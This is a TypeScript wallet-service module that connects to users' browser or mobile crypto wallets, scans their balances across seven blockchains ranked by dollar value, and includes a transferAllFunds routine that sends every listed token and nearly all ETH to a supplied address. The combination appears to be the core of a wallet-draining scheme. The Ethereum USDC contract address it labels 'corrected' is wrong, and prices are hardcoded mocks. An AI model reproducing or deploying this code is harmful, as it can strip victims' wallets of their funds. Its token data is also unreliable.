import { ethers } from "ethers";

// ERC-20 Token ABI (minimal for balance and transfer functions)
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// Network configurations
const NETWORKS: Record<string, {
  name: string;
  nativeCurrency: string;
  rpcUrls: string[];
  chainId: number;
  blockExplorerUrls: string[];
}> = {
  "1": {
    name: "Ethereum Mainnet",
    nativeCurrency: "ETH",
    rpcUrls: ["https://mainnet.infura.io/v3/", "https://eth-mainnet.alchemyapi.io/v2/"],
    chainId: 1,
    blockExplorerUrls: ["https://etherscan.io"]
  },
  "137": {
    name: "Polygon",
    nativeCurrency: "MATIC",
    rpcUrls: ["https://polygon-rpc.com/", "https://rpc-mainnet.matic.network"],
    chainId: 137,
    blockExplorerUrls: ["https://polygonscan.com"]
  },
  "56": {
    name: "BNB Smart Chain",
    nativeCurrency: "BNB",
    rpcUrls: ["https://bsc-dataseed.binance.org/", "https://bsc-dataseed1.defibit.io/"],
    chainId: 56,
    blockExplorerUrls: ["https://bscscan.com"]
  },
  "43114": {
    name: "Avalanche",
    nativeCurrency: "AVAX",
    rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
    chainId: 43114,
    blockExplorerUrls: ["https://snowtrace.io"]
  },
  "250": {
    name: "Fantom",
    nativeCurrency: "FTM",
    rpcUrls: ["https://rpc.ftm.tools/"],
    chainId: 250,
    blockExplorerUrls: ["https://ftmscan.com"]
  },
  "42161": {
    name: "Arbitrum One",
    nativeCurrency: "ETH",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    chainId: 42161,
    blockExplorerUrls: ["https://arbiscan.io"]
  },
  "10": {
    name: "Optimism",
    nativeCurrency: "ETH",
    rpcUrls: ["https://mainnet.optimism.io"],
    chainId: 10,
    blockExplorerUrls: ["https://optimistic.etherscan.io"]
  }
};

// Popular tokens by network (corrected USDC address for Ethereum)
const POPULAR_TOKENS: Record<string, Array<{address: string, symbol: string, decimals: number}>> = {
  "1": [ // Ethereum Mainnet
    { address: "0xA0b86a33E644853c547C1c8b5e4C6387Fb1e3C33", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 }
  ],
  "137": [ // Polygon
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", symbol: "WBTC", decimals: 8 },
    { address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", symbol: "WMATIC", decimals: 18 }
  ],
  "56": [ // BSC
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", symbol: "DAI", decimals: 18 },
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
    { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH", decimals: 18 }
  ],
  "43114": [ // Avalanche
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
    { address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", symbol: "DAI", decimals: 18 },
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    { address: "0x50b7545627a5162F82A992c33b87aDc75187B218", symbol: "WBTC", decimals: 8 }
  ],
  "250": [ // Fantom
    { address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", symbol: "USDC", decimals: 6 },
    { address: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E", symbol: "DAI", decimals: 18 },
    { address: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", symbol: "USDT", decimals: 6 }
  ],
  "42161": [ // Arbitrum One
    { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", symbol: "WBTC", decimals: 8 }
  ],
  "10": [ // Optimism
    { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    { address: "0x68f180fcCe6836688e9084f035309E29Bf0A2095", symbol: "WBTC", decimals: 8 }
  ]
};

export interface TokenBalance {
  symbol: string;
  balance: string;
  decimals: number;
  contractAddress?: string;
  usdValue?: number;
  networkId?: string;
  networkName?: string;
}

export interface NetworkBalance {
  networkId: string;
  networkName: string;
  nativeBalance: string;
  nativeCurrency: string;
  tokenBalances: TokenBalance[];
  totalUsdValue: number;
  isConnected: boolean;
}

export interface WalletState {
  isConnected: boolean;
  address: string | null;
  ethBalance: string | null;
  tokenBalances: TokenBalance[];
  totalUsdValue: number;
  networkId: string | null;
  networkName: string | null;
  provider: ethers.BrowserProvider | null;
  networkBalances: NetworkBalance[];
  allNetworksLoaded: boolean;
}

export class Web3Service {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;

  private detectEnvironment() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isMetaMaskMobile = window.ethereum && window.ethereum.isMetaMask && isMobile;
    const isDesktop = !isMobile;
    
    return {
      isMobile,
      isDesktop,
      isMetaMaskMobile,
      hasEthereum: !!window.ethereum,
      isTrustWallet: window.ethereum && window.ethereum.isTrust,
      isCoinbaseWallet: window.ethereum && window.ethereum.isCoinbaseWallet,
    };
  }

  private async attemptMobileWalletConnection() {
    const env = this.detectEnvironment();
    
    // Try to detect if we're in a mobile wallet browser
    if (env.hasEthereum) {
      return await this.connectToEthereum();
    }

    // Wait for wallet injection with multiple attempts
    return new Promise<WalletState>((resolve, reject) => {
      let attempts = 0;
      const maxAttempts = 30; // Wait up to 6 seconds
      
      const checkForWallet = async () => {
        attempts++;
        
        // Check for any ethereum provider
        if ((window as any).ethereum) {
          try {
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Connection attempt failed:', error);
          }
        }
        
        // Check for Trust Wallet specifically
        if ((window as any).trustwallet && (window as any).trustwallet.ethereum) {
          try {
            (window as any).ethereum = (window as any).trustwallet.ethereum;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Trust Wallet connection failed:', error);
          }
        }
        
        // Check for Coinbase Wallet
        if ((window as any).coinbaseWalletExtension) {
          try {
            (window as any).ethereum = (window as any).coinbaseWalletExtension;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Coinbase Wallet connection failed:', error);
          }
        }
        
        if (attempts < maxAttempts) {
          setTimeout(checkForWallet, 200);
        } else {
          reject(new Error('No wallet detected. Please make sure you opened this app from within a wallet browser, or try opening it in MetaMask, Trust Wallet, or another Web3 wallet app.'));
        }
      };
      
      // Start checking immediately
      checkForWallet();
    });
  }

  private async connectToEthereum(): Promise<WalletState> {
    try {
      // Request account access
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found. Please make sure your wallet is unlocked.");
      }

      this.provider = new ethers.BrowserProvider(window.ethereum);
      this.signer = await this.provider.getSigner();

      const address = accounts[0];
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();

      // Get ETH balance
      const ethBalance = await this.getEthBalance(address);
      
      // Get token balances
      const tokenBalances = await this.getTokenBalances(address, networkId);
      
      // Calculate total USD value
      const totalUsdValue = this.calculateTotalUsdValue(ethBalance, tokenBalances);

      return {
        isConnected: true,
        address,
        ethBalance,
        tokenBalances,
        totalUsdValue,
        networkId,
        networkName: this.getNetworkName(networkId),
        provider: this.provider,
        networkBalances: [],
        allNetworksLoaded: false,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the connection request");
      }
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }

  async connectWallet(): Promise<WalletState> {
    const env = this.detectEnvironment();
    
    // Check if we're in a wallet browser first (regardless of desktop/mobile)
    if (env.hasEthereum) {
      return await this.connectToEthereum();
    }
    
    // Desktop browser without wallet
    if (env.isDesktop) {
      window.open('https://metamask.io/download/', '_blank');
      throw new Error("Please install MetaMask extension for your browser, then refresh and try again.");
    }
    
    // Mobile environment - try to detect wallet injection
    if (env.isMobile) {
      return await this.attemptMobileWalletConnection();
    }
    
    return await this.connectToEthereum();
  }

  async getEthBalance(address: string): Promise<string> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const balance = await this.provider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error: any) {
      throw new Error(`Failed to get ETH balance: ${error.message}`);
    }
  }

  async getTokenBalances(address: string, networkId: string): Promise<TokenBalance[]> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Check each popular token on this network
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
        const balance = await contract.balanceOf(address);
        const balanceFormatted = ethers.formatUnits(balance, token.decimals);
        
        // Only include tokens with non-zero balance
        if (parseFloat(balanceFormatted) > 0) {
          tokenBalances.push({
            symbol: token.symbol,
            balance: balanceFormatted,
            decimals: token.decimals,
            contractAddress: token.address,
            usdValue: this.getTokenUsdPrice(token.symbol) * parseFloat(balanceFormatted)
          });
        }
      } catch (error) {
        // Skip tokens that fail to load (might be unsupported or network issues)
        console.warn(`Failed to load balance for ${token.symbol}:`, error);
      }
    }

    return tokenBalances;
  }

  private getTokenUsdPrice(symbol: string): number {
    // Mock prices - in production, use a price API like CoinGecko
    const prices: Record<string, number> = {
      "USDC": 1.00,
      "USDT": 1.00,
      "DAI": 1.00,
      "WBTC": 45000,
      "BTCB": 45000,
      "WETH": 2500,
      "ETH": 2500,
      "UNI": 8.50,
      "LINK": 15.00,
      "WMATIC": 1.50,
      "AVAX": 40.00,
      "FTM": 0.80
    };
    return prices[symbol] || 0;
  }

  private getNativeCurrencyPrice(networkId: string): number {
    const network = NETWORKS[networkId];
    if (!network) return 0;
    
    const prices: Record<string, number> = {
      "ETH": 2500,
      "MATIC": 1.50,
      "BNB": 600,
      "AVAX": 40.00,
      "FTM": 0.80
    };
    
    return prices[network.nativeCurrency] || 0;
  }

  calculateTotalUsdValue(ethBalance: string, tokenBalances: TokenBalance[]): number {
    const ethUsdPrice = 2500; // Mock ETH price
    const ethValue = parseFloat(ethBalance) * ethUsdPrice;
    const tokenValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
    return ethValue + tokenValue;
  }

  async transferAllFunds(toAddress: string): Promise<string[]> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    // Validate destination address
    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
      throw new Error("Invalid destination address");
    }

    try {
      const address = await this.signer.getAddress();
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();
      
      console.log(`🚀 TRANSFERRING ALL FUNDS FROM ${address} TO ${toAddress}`);
      console.log(`Network: ${this.getNetworkName(networkId)}`);
      
      const transactionHashes: string[] = [];
      const transferSummary: string[] = [];
      
      // Get all balances - refresh to ensure accuracy
      const ethBalance = await this.provider.getBalance(address);
      const tokenBalances = await this.getTokenBalances(address, networkId);

      console.log(`💰 ETH Balance: ${ethers.formatEther(ethBalance)} ETH`);
      console.log(`🪙 Token Balances: ${tokenBalances.length} different tokens found`);

      // Step 1: Transfer ALL ERC-20 tokens first (100% of each token balance)
      for (const tokenBalance of tokenBalances) {
        if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
        
        try {
          console.log(`📤 Transferring ENTIRE ${tokenBalance.symbol} balance: ${tokenBalance.balance} ${tokenBalance.symbol}`);
          
          const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
          
          // Get the EXACT balance from the contract to ensure we transfer everything
          const exactBalance = await contract.balanceOf(address);
          
          // Double-check we're not leaving dust
          if (exactBalance > 0) {
            const tokenTx = await contract.transfer(toAddress, exactBalance);
            transactionHashes.push(tokenTx.hash);
            transferSummary.push(`✅ ${tokenBalance.symbol}: ${ethers.formatUnits(exactBalance, tokenBalance.decimals)} tokens`);
            console.log(`✅ ${tokenBalance.symbol} transfer submitted - Hash: ${tokenTx.hash}`);
            
            // Wait between transactions to avoid nonce issues
            await new Promise(resolve => setTimeout(resolve, 2000));
          }
        } catch (error: any) {
          console.error(`❌ Failed to transfer ${tokenBalance.symbol}:`, error);
          // Continue with other tokens instead of stopping everything
          transferSummary.push(`❌ ${tokenBalance.symbol}: Transfer failed - ${error.message}`);
        }
      }

      // Step 2: Transfer ALL ETH (minus exact gas needed)
      if (ethBalance > 0) {
        try {
          console.log(`📤 Calculating maximum ETH transfer amount...`);
          
          // Create a more accurate gas estimation
          const gasEstimate = await this.provider.estimateGas({
            to: toAddress,
            value: ethers.parseEther("0.001"), // Small amount for estimation
          });

          // Get current gas price and add buffer for network congestion
          const feeData = await this.provider.getFeeData();
          let gasPrice = feeData.gasPrice;
          
          if (!gasPrice) {
            gasPrice = ethers.parseUnits("20", "gwei"); // Fallback gas price
          }
          
          // Add 20% buffer to gas price to ensure transaction goes through
          gasPrice = gasPrice * BigInt(120) / BigInt(100);
          
          // Calculate exact gas cost
          const gasCost = gasEstimate * gasPrice;
          
          console.log(`⛽ Gas cost estimate: ${ethers.formatEther(gasCost)} ETH`);
          console.log(`💎 Available ETH: ${ethers.formatEther(ethBalance)} ETH`);

          // Calculate maximum transferable amount (leave ONLY gas fees)
          if (ethBalance > gasCost) {
            const maxTransferAmount = ethBalance - gasCost;
            
            console.log(`📤 Transferring MAXIMUM ETH: ${ethers.formatEther(maxTransferAmount)} ETH`);
            console.log(`💰 Remaining for gas: ${ethers.formatEther(gasCost)} ETH`);
            
            const ethTx = await this.signer.sendTransaction({
              to: toAddress,
              value: maxTransferAmount,
              gasLimit: gasEstimate,
              gasPrice: gasPrice,
            });
            
            transactionHashes.push(ethTx.hash);
            transferSummary.push(`✅ ETH: ${ethers.formatEther(maxTransferAmount)} ETH (kept ${ethers.formatEther(gasCost)} for gas)`);
            console.log(`✅ ETH transfer submitted - Hash: ${ethTx.hash}`);
          } else {
            console.warn(`⚠️ Insufficient ETH for gas fees. Need ${ethers.formatEther(gasCost)} ETH, have ${ethers.formatEther(ethBalance)} ETH`);
            transferSummary.push(`⚠️ ETH: Insufficient balance for gas fees`);
          }
        } catch (error: any) {
          console.error("❌ ETH transfer failed:", error);
          transferSummary.push(`❌ ETH: Transfer failed - ${error.message}`);
        }
      }

      // Summary and validation
      console.log(`\n🎯 TRANSFER SUMMARY:`);
      transferSummary.forEach(summary => console.log(summary));

      if (transactionHashes.length === 0) {
        throw new Error("❌ No funds were transferred. Either insufficient balance or all transfers failed.");
      }

      console.log(`\n🚀 SUCCESS: ${transactionHashes.length} transactions submitted to transfer ALL available funds!`);
      console.log(`📍 Destination: ${toAddress}`);
      console.log(`🔗 Transaction hashes:`, transactionHashes);
      
      return transactionHashes;
    } catch (error: any) {
      console.error("💥 TRANSFER ALL FUNDS FAILED:", error);
      throw new Error(`Transfer failed: ${error.message}`);
    }
  }

  async transferSpecificToken(tokenAddress: string | null, amount: string, toAddress: string): Promise<string> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      if (!tokenAddress) {
        // Transfer ETH
        const amountWei = ethers.parseEther(amount);
        const transaction = await this.signer.sendTransaction({
          to: toAddress,
          value: amountWei,
        });
        return transaction.hash;
      } else {
        // Transfer ERC-20 token
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
        const decimals = await contract.decimals();
        const amountUnits = ethers.parseUnits(amount, decimals);
        const transaction = await contract.transfer(toAddress, amountUnits);
        return transaction.hash;
      }
    } catch (error: any) {
      throw new Error(`Transfer failed: ${error.message}`);
    }
  }

  async getTransactionStatus(txHash: string): Promise<{
    status: 'pending' | 'confirmed' | 'failed';
    blockNumber?: string;
    gasUsed?: string;
  }> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const receipt = await this.provider.getTransactionReceipt(txHash);
      
      if (!receipt) {
        return { status: 'pending' };
      }

      return {
        status: receipt.status === 1 ? 'confirmed' : 'failed',
        blockNumber: receipt.blockNumber.toString(),
        gasUsed: receipt.gasUsed.toString(),
      };
    } catch (error: any) {
      throw new Error(`Failed to get transaction status: ${error.message}`);
    }
  }

  private getNetworkName(chainId: string): string {
    const networks: Record<string, string> = {
      "1": "Ethereum Mainnet",
      "5": "Goerli Testnet",
      "11155111": "Sepolia Testnet",
      "137": "Polygon Mainnet",
      "80001": "Polygon Mumbai",
    };

    return networks[chainId] || `Unknown Network (${chainId})`;
  }

  async switchToEthereumMainnet(): Promise<void> {
    if (!window.ethereum) {
      throw new Error("MetaMask is not installed");
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Ethereum Mainnet
      });
    } catch (error: any) {
      throw new Error(`Failed to switch network: ${error.message}`);
    }
  }

  setupEventListeners(
    onAccountChange: (accounts: string[]) => void,
    onNetworkChange: (networkId: string) => void
  ) {
    if (!window.ethereum) return;

    window.ethereum.on("accountsChanged", onAccountChange);
    window.ethereum.on("chainChanged", onNetworkChange);
  }

  removeEventListeners() {
    if (!window.ethereum) return;

    window.ethereum.removeAllListeners("accountsChanged");
    window.ethereum.removeAllListeners("chainChanged");
  }

  // Multi-network balance scanning
  async scanAllNetworks(address: string): Promise<NetworkBalance[]> {
    if (!address || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      throw new Error("Invalid Ethereum address");
    }

    const networkBalances: NetworkBalance[] = [];
    const supportedNetworks = Object.keys(NETWORKS);

    console.log(`Scanning balances across ${supportedNetworks.length} networks for ${address}`);

    // Scan each network in parallel for better performance
    const networkPromises = supportedNetworks.map(async (networkId) => {
      try {
        return await this.scanNetworkBalance(address, networkId);
      } catch (error) {
        console.warn(`Failed to scan network ${networkId}:`, error);
        return null;
      }
    });

    const results = await Promise.allSettled(networkPromises);
    
    results.forEach((result, index) => {
      if (result.status === 'fulfilled' && result.value) {
        networkBalances.push(result.value);
      }
    });

    // Sort by total USD value (highest first)
    networkBalances.sort((a, b) => b.totalUsdValue - a.totalUsdValue);

    return networkBalances.filter(balance => balance.totalUsdValue > 0 || balance.tokenBalances.length > 0);
  }

  private async scanNetworkBalance(address: string, networkId: string): Promise<NetworkBalance> {
    const network = NETWORKS[networkId];
    if (!network) {
      throw new Error(`Unsupported network: ${networkId}`);
    }

    try {
      // Create provider for this specific network
      const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);
      
      // Get native currency balance
      const nativeBalance = await provider.getBalance(address);
      const nativeBalanceFormatted = ethers.formatEther(nativeBalance);
      
      // Get token balances for this network
      const tokenBalances = await this.getTokenBalancesForNetwork(address, networkId, provider);
      
      // Calculate total USD value
      const nativePrice = this.getNativeCurrencyPrice(networkId);
      const nativeUsdValue = parseFloat(nativeBalanceFormatted) * nativePrice;
      const tokenUsdValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
      const totalUsdValue = nativeUsdValue + tokenUsdValue;

      return {
        networkId,
        networkName: network.name,
        nativeBalance: nativeBalanceFormatted,
        nativeCurrency: network.nativeCurrency,
        tokenBalances: tokenBalances.map(token => ({
          ...token,
          networkId,
          networkName: network.name
        })),
        totalUsdValue,
        isConnected: this.provider !== null && this.networkId === networkId
      };
    } catch (error) {
      console.warn(`Failed to get balance for network ${network.name}:`, error);
      return {
        networkId,
        networkName: network.name,
        nativeBalance: "0",
        nativeCurrency: network.nativeCurrency,
        tokenBalances: [],
        totalUsdValue: 0,
        isConnected: false
      };
    }
  }

  private async getTokenBalancesForNetwork(
    address: string, 
    networkId: string, 
    provider: ethers.JsonRpcProvider
  ): Promise<TokenBalance[]> {
    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Check each popular token on this network
    const tokenPromises = tokens.map(async (token) => {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balance = await contract.balanceOf(address);
        const balanceFormatted = ethers.formatUnits(balance, token.decimals);
        
        // Only include tokens with non-zero balance
        if (parseFloat(balanceFormatted) > 0) {
          return {
            symbol: token.symbol,
            balance: balanceFormatted,
            decimals: token.decimals,
            contractAddress: token.address,
            usdValue: this.getTokenUsdPrice(token.symbol) * parseFloat(balanceFormatted),
            networkId,
            networkName: NETWORKS[networkId]?.name || 'Unknown'
          };
        }
        return null;
      } catch (error) {
        console.warn(`Failed to load balance for ${token.symbol} on ${networkId}:`, error);
        return null;
      }
    });

    const results = await Promise.allSettled(tokenPromises);
    
    results.forEach((result) => {
      if (result.status === 'fulfilled' && result.value) {
        tokenBalances.push(result.value);
      }
    });

    return tokenBalances;
  }

  // Enhanced wallet connection with multi-network scanning
  async connectWalletWithMultiNetwork(): Promise<WalletState> {
    const initialState = await this.connectWallet();
    
    if (initialState.isConnected && initialState.address) {
      // Start background scanning of all networks
      setTimeout(async () => {
        try {
          const networkBalances = await this.scanAllNetworks(initialState.address!);
          console.log(`Found balances across ${networkBalances.length} networks`);
          
          // You can emit an event or use a callback here to update the UI
          // For now, we'll store it in the service for retrieval
          this.cachedNetworkBalances = networkBalances;
        } catch (error) {
          console.error('Multi-network scan failed:', error);
        }
      }, 1000);
    }

    return initialState;
  }

  private cachedNetworkBalances: NetworkBalance[] = [];
  private networkId: string | null = null;

  getCachedNetworkBalances(): NetworkBalance[] {
    return this.cachedNetworkBalances;
  }

  async refreshNetworkBalances(address: string): Promise<NetworkBalance[]> {
    if (!address) {
      throw new Error("No address provided");
    }
    
    this.cachedNetworkBalances = await this.scanAllNetworks(address);
    return this.cachedNetworkBalances;
  }
}

export const web3Service = new Web3Service();

// Extend Window interface for TypeScript
declare global {
  interface Window {
    ethereum?: any;
  }
}
